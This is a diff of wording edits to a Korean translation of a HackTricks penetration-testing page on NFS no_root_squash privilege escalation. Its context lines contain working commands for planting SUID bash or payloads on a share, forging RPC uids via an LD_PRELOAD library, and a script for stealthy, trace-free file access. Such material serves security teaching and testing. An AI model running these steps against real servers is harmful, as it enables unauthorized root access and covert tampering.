@@ -31,7 +31,7 @@ _read the_ **/etc/exports** _파일을 읽어보세요. 만약 **no\_root\_squas
 
 이 취약점을 발견했다면, 이를 악용할 수 있습니다:
 
-* 클라이언트 머신에서 해당 디렉토리를 **마운트**하고, **root로** 마운트된 폴더 안에 **/bin/bash** 바이너리를 복사한 후 **SUID** 권한을 부여하고, 피해자 머신에서 그 bash 바이너리를 실행합니다.
+* 클라이언트 머신에서 해당 디렉토리를 **마운트**하고, **root로** 마운트된 폴더 안에 **/bin/bash** 바이너리를 복사한 후 **SUID** 권한을 부여하고, 피해자 머신에서 그 bash 바이너리를 **실행**합니다.
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -44,7 +44,7 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-* **클라이언트 머신에서 해당 디렉토리를 마운트**하고, **루트로 복사하여** 마운트된 폴더 안에 SUID 권한을 악용할 컴파일된 페이로드를 넣고, **희생자** 머신에서 해당 바이너리를 **실행**합니다 (여기에서 일부 [C SUID 페이로드](payloads-to-execute.md#c)를 찾을 수 있습니다).
+* **클라이언트 머신에서 해당 디렉토리를 마운트**하고, **루트로 복사**하여 마운트된 폴더 안에 SUID 권한을 악용할 컴파일된 페이로드를 넣고, **희생자** 머신에서 해당 바이너리를 **실행**합니다 (여기에서 일부 [C SUID 페이로드](payloads-to-execute.md#c)를 찾을 수 있습니다).
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -82,7 +82,7 @@ gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib
 ```
 ### Exploit 수행
 
-이 익스플로잇은 권한을 루트로 상승시키고 셸을 실행하는 간단한 C 프로그램(`pwn.c`)을 만드는 것을 포함합니다. 프로그램은 컴파일되고, 결과 바이너리(`a.out`)는 suid root로 공유에 배치되며, RPC 호출에서 uid를 위조하기 위해 `ld_nfs.so`를 사용합니다:
+이 exploit는 root 권한을 상승시키고 shell을 실행하는 간단한 C 프로그램(`pwn.c`)을 생성하는 것을 포함합니다. 프로그램이 컴파일되고, 결과 이진 파일(`a.out`)이 suid root로 공유에 배치되며, `ld_nfs.so`를 사용하여 RPC 호출에서 uid를 위조합니다:
 
 1. **익스플로잇 코드 컴파일:**
 ```bash
@@ -99,14 +99,14 @@ LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs:
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
 ```
 
-3. **익스플로잇을 실행하여 루트 권한 획득:**
+3. **익스플로잇을 실행하여 root 권한 획득:**
 ```bash
 /mnt/share/a.out
 #root
 ```
 
 ## 보너스: NFShell을 통한 은밀한 파일 접근
-루트 접근이 얻어진 후, 소유권을 변경하지 않고(NFS 공유와의 상호작용에서 흔적을 남기지 않기 위해) NFS 공유와 상호작용하기 위해 Python 스크립트(nfsh.py)가 사용됩니다. 이 스크립트는 접근하는 파일의 uid와 일치하도록 조정하여 권한 문제 없이 공유의 파일과 상호작용할 수 있게 합니다:
+root 접근이 얻어진 후, 소유권을 변경하지 않고 NFS 공유와 상호작용하기 위해 (흔적을 남기지 않기 위해) Python 스크립트(nfsh.py)가 사용됩니다. 이 스크립트는 접근하는 파일의 uid와 일치하도록 조정하여, 권한 문제 없이 공유의 파일과 상호작용할 수 있게 합니다:
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
@@ -139,8 +139,8 @@ GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt=
 <summary>HackTricks 지원하기</summary>
 
 * [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
-* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
-* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
+* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**
 
 </details>
 {% endhint %}
